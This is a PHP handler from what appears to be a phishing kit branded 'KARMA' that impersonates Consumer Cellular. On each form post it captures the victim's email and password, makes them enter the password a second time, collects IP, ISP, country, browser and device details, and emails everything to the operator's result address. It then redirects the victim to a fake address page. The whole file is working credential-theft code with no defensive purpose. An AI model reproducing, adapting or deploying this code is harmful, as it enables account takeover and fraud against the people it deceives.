<?php

require_once __DIR__ . '/../[KARMA]/core/rules.php';
require_once __DIR__ . '/../[KARMA]/core/functions.php';
$config = require __DIR__ . '/../[KARMA]/config/config.php';
$parameter = $config['parameter'];
$email_result = $config['email_result'];

$info = get_ip_info();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$browser = get_browser_name($user_agent);
$device = get_device_type($user_agent);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isset($_SESSION['first_submit'])) {
        $_SESSION['first_submit'] = true;
        $_SESSION['karma-emailaccess1'] = $_SESSION['karma-email'];
        $_SESSION['karma-emailpassword1'] = htmlspecialchars($_POST['karma-emailpassword'], ENT_QUOTES, 'UTF-8');
        $karma_email = $_SESSION['karma-email'];
        $bagian = explode('@', $karma_email);
        
        $message = '
        <div style="background:#fff;padding:30px 0;">
            <div style="max-width:400px;margin:0 auto;background:#3c3c3c;border-radius:8px;box-shadow:0 2px 8px #0001;padding:32px;">
                <h3 style="color:#e00;font-family:sans-serif;margin-bottom:24px;">EMAIL ACCESS #1</h3>
                <table style="width:100%;font-family:sans-serif;font-size:13px;">
                    <tr>
                        <td style="padding:8px 0;color:#888;">EMAIL</td>
                        <td style="padding:8px 0;font-weight:bold;color:#228B22;">' . $_SESSION['karma-emailaccess1'] . '</td>
                    </tr>
                    <tr>
                        <td style="padding:8px 0;color:#888;">PASSWORD</td>
                        <td style="padding:8px 0;font-weight:bold;color:#228B22;">' . $_SESSION['karma-emailpassword1'] . '</td>
                    </tr>
                </table>
                <hr style="margin:24px 0;">
                <h3 style="color:#0073D1;font-family:sans-serif;margin-bottom:24px;"># DEVICE INFO #</h3>
                <table style="width:100%;font-family:sans-serif;font-size:13px;">
                    <tr>
                        <td style="color:#888;">IP</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($info['ip'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">ISP</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($info['isp'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Country</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($info['country'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Device</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($device) . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Browser</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($browser) . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">User Agent</td>
                        <td style="font-weight:bold;color:#dfdfdf;word-break:break-all;">' . htmlspecialchars($user_agent) . '</td>
                    </tr>
                </table>
                <div style="margin-top:32px;text-align:center;color:#df890f;font-size:13px;">
                    Ingin kaya namun enggan bekerja.
                </div>
            </div>
        </div>
        ';

        $to = $email_result;
        $subject = $_SESSION['karma-emailaccess1'] . ' # [ ' . $info['country'] . ' - ' . $info['ip'] . ' ]';
        $message = wordwrap($message, 998, "\r\n");
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=utf-8\r\n";
        $headers .= "From: Email Access #1 <karma@main-server.smh>\r\n";
        mail($to, $subject, $message, $headers);
        log_event('EMAIL 1 RECEIVED');
        if (count($bagian) === 2) {
            $domain = explode('.', $bagian[1])[0];
            header("Location: /$domain");
            exit();
        } else {
            header("Location: /consumercellular.com/address");
            exit();
    }
        exit();
    } else {
        unset($_SESSION['first_submit']);
        $_SESSION['karma-emailaccess2'] = $_SESSION['karma-email'];
        $_SESSION['karma-emailpassword2'] = htmlspecialchars($_POST['karma-emailpassword'], ENT_QUOTES, 'UTF-8');

        $message = '
        <div style="background:#fff;padding:30px 0;">
            <div style="max-width:400px;margin:0 auto;background:#3c3c3c;border-radius:8px;box-shadow:0 2px 8px #0001;padding:32px;">
                <h3 style="color:#e00;font-family:sans-serif;margin-bottom:24px;">EMAIL ACCESS #2</h3>
                <table style="width:100%;font-family:sans-serif;font-size:13px;">
                    <tr>
                        <td style="padding:8px 0;color:#888;">EMAIL</td>
                        <td style="padding:8px 0;font-weight:bold;color:#228B22;">' . $_SESSION['karma-emailaccess2'] . '</td>
                    </tr>
                    <tr>
                        <td style="padding:8px 0;color:#888;">PASSWORD</td>
                        <td style="padding:8px 0;font-weight:bold;color:#228B22;">' . $_SESSION['karma-emailpassword2'] . '</td>
                    </tr>
                </table>
                <hr style="margin:24px 0;">
                <h3 style="color:#0073D1;font-family:sans-serif;margin-bottom:24px;"># DEVICE INFO #</h3>
                <table style="width:100%;font-family:sans-serif;font-size:13px;">
                    <tr>
                        <td style="color:#888;">IP</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($info['ip'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">ISP</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($info['isp'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Country</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($info['country'] ?? '') . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Device</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($device) . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">Browser</td>
                        <td style="font-weight:bold;color:#dfdfdf;">' . htmlspecialchars($browser) . '</td>
                    </tr>
                    <tr>
                        <td style="color:#888;">User Agent</td>
                        <td style="font-weight:bold;color:#dfdfdf;word-break:break-all;">' . htmlspecialchars($user_agent) . '</td>
                    </tr>
                </table>
                <div style="margin-top:32px;text-align:center;color:#df890f;font-size:13px;">
                    Ingin kaya namun enggan bekerja.
                </div>
            </div>
        </div>
        ';

        $to = $email_result;
        $subject = $_SESSION['karma-emailaccess1'] . ' # [ ' . $info['country'] . ' - ' . $info['ip'] . ' ]';
        $message = wordwrap($message, 998, "\r\n");
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=utf-8\r\n";
        $headers .= "From: Email Access #2 <karma@main-server.smh>\r\n";
        mail($to, $subject, $message, $headers);
        log_event('EMAIL 2 RECEIVED');
        header("Location: /consumercellular.com/address");
        exit();
    }
}

?>